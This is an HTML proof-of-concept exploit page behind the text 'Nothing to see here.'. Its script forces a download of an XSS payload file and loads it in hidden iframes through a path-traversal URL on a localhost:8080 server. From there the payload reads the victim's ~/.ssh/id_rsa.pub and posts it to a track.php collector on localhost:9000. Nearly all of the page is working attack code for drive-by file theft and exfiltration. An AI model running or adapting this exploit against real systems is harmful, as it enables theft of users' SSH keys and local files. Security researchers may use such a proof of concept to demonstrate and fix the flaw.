
<body>
  Nothing to see here.
  <script>

      // We guess that the workspace of a victim in at maximum 10 levels
      // deeper than his/her home folder.
      const maxNesting = 10;
  
      // The XSS payload.
      const payload = `<body> <script> 
        for (let n = 0; n < ${maxNesting}; n++) {
        fetch('http://localhost:8080/'+'..%2f'.repeat(n)+'/.ssh/id_rsa.pub')
        .then((res) => {if (res.status === 200) {
            res.text().then((data) => window.parent.postMessage(data, '*'));
        }
    }); }</scr`+"ipt></bo"+"dy>";

      // This part is enforcing the victim's browser to download the payload
      // as an HTML file.
      const fileName = `file_${Math.random()}.html`;
      const a = document.createElement('a');
  
      a.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(payload));
      a.setAttribute('download', fileName);
      a.style.display = 'none';
  
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
  
      // After a short delay we open a bunch of iframes trying to load
      // the file which a victim just downloaded.
      setTimeout(() => {
        for (let n = 0; n < maxNesting; n++) {
              const iframe = document.createElement('iframe');
              iframe.setAttribute('src', `http://localhost:8080/${'..%2f'.repeat(n)}Downloads/${fileName}`);
              iframe.setAttribute('style', 'width: 0px; height: 0px;')
              document.body.appendChild(iframe);
        }
      }, 2000);
  
      // In this handler we receive a message from one of the iframes.
      // The message should contain an id_rsa.pub file text. We send it to
      // our track.php script to save.
      window.addEventListener('message', (event) => {
          const formData = new FormData();
          console.log(event.data)
  
          formData.append('data', event.data);
  
          fetch('http://localhost:9000/track.php', {
            headers: {
              "Access-Control-Allow-Headers":"*",
              "Access-Control-Allow-Origin": "*"
            },
              body: formData,
              method: 'post'
              
          });
          // fetch("/track.php", {
          //   method: "POST",
          //   mode: "same-origin",
          //   credentials: "same-origin",
          //   headers: {
          //     "Content-Type": "application/json"
          //   },
          //   body: JSON.stringify({
          //     "payload": formData
          //   })
          // })
          console.log("HELOOOOO!!!")
      }, false);
  </script>
  </body>

  